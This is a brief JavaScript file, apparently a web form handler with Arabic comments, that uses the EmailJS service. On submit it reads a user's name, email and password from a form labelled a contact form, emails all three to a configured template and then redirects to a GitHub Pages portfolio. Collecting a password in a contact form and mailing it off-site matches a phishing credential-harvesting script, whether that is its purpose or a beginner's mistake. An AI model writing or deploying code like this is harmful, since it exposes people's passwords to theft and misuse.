 //! Back End (Email js service)

emailjs.init('O73WVa3w8Y19tLK0Q');

document.getElementById('contactForm').addEventListener('submit', function(event) {
  event.preventDefault();

  const templateParams = {
    user_name: document.getElementById('user_name').value,
    user_email: document.getElementById('user_email').value,
    user_password: document.getElementById('user_password').value,
  };

  emailjs.send('service_qqhp7om', 'template_dhx7cby', templateParams)
    .then(function(response) {
      console.log('SUCCESS!', response.status, response.text);
      // تحويل المستخدم للرابط بعد الإرسال بنجاح
      window.location.href = "https://code-mo-dev.github.io/Portfolio/";
    }, function(error) {
      console.log('FAILED...', error);
      alert('حدث خطأ أثناء الإرسال: ' + error.text);
    });
});
